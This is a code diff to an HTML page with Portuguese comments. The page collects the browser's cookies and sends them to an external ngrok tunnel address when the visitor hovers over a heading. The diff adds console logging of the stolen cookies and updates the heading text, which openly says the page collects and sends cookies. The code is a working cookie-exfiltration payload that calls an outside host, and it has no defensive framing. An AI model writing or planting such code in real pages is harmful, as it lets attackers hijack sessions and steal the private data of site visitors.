@@ -7,6 +7,9 @@
       // Obtém os cookies do documento
       var cookies = document.cookie;
       
+      // Exibe os cookies no console
+      console.log("Cookies coletados: " + cookies);
+      
       // Cria um objeto XMLHttpRequest para enviar os cookies para o servidor
       var xhr = new XMLHttpRequest();
       xhr.open("GET", "http://0.tcp.sa.ngrok.io:19439/log_cookie?cookie=" + encodeURIComponent(cookies), true);
@@ -21,7 +24,7 @@
 </head>
 <body>
   <h1 onmouseover="sendCookiesToServer()">
-    Passe o mouse aqui para coletar e enviar os cookies
+    Passe o mouse aqui para coletar, enviar e imprimir os cookies
   </h1>
 
   <p><strong>Cookies: </strong><span id="cookieDisplay">Nenhum cookie disponível</span></p>
